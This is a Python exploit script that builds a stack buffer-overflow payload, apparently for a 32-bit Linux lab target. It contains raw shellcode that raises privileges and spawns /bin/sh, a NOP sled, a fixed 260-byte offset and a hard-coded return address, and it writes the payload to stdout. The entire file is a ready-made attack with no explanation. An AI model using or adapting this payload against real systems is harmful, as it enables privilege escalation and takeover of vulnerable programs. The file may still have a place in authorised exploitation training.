import sys

print_shellcode = (
    "\x31\xc0"              # xor eax, eax
    "\xb0\x04"              # mov al, 4 (sys_write)
    "\x31\xdb"              # xor ebx, ebx
    "\xb3\x01"              # mov bl, 1 (stdout)
    "\x68\x0a\x52\x54\x4e"  # push dword "\nRET" (little endian)
    "\x68\x45\x4e\x54\x45"  # push dword "ENTE"
    "\x89\xe1"              # mov ecx, esp
    "\xb2\x06"              # mov dl, 6
    "\xcd\x80"              # int 0x80
)
# Shellcode from shellcode.py
root_shellcode = ('\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80'#root shellcode
            +'\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80'
            +'\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0'
            +'\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80'
            +'\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68'
            +'\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0'
            +'\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90')

shellcode = print_shellcode + root_shellcode
# Offset before return address
offset = 260

# Address pointing back into buffer (adjust if needed)
ret = 0xbffffa04

# Build payload
nop_sled = "\x90" * (offset - len(shellcode))
ret_addr = "".join([
    chr(ret & 0xff),
    chr((ret >> 8) & 0xff),
    chr((ret >> 16) & 0xff),
    chr((ret >> 24) & 0xff)
])

payload = nop_sled + shellcode + (ret_addr*8)

# Output
sys.stdout.write(payload)
